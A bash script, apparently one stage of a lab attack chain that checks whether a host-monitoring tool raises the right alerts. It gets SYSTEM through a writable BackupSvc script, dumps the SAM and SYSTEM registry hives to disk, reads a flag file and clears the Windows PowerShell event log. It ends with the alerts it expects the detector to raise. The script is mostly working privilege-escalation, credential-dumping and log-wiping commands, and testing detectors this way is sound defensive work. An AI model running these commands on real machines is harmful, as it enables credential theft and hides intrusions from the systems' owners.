#!/usr/bin/env bash
# Stage 4 — SYSTEM through the writable BackupSvc script, then credential
# access (SAM hive) and a little anti-forensics.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

check_target

say "IIS app pool may run BackupSvc — executing a SYSTEM command"
root 'whoami' | strip

say "dumping SAM and SYSTEM hives"
root 'reg save HKLM\SAM C:\Windows\Temp\sam.save /y'
root 'reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y'

say "reading the SYSTEM flag"
root 'type C:\Windows\flag.txt' | strip

say "covering tracks (PowerShell log, not Security — leave 4688 intact)"
rce 'wevtutil cl "Windows PowerShell"' | strip

note "expected on the target:"
note "  process INFO     schtasks /run BackupSvc / cmd.exe running backup.bat as SYSTEM"
note "  process CRITICAL cred-regsave — reg save HKLM\\SAM (and SYSTEM)"
note "  process CRITICAL flag-access — C:\\Windows\\flag.txt"
note "  process HIGH     antiforensics-shred — wevtutil cl"
note "  process INFO     every exec above (log_all_process_events)"
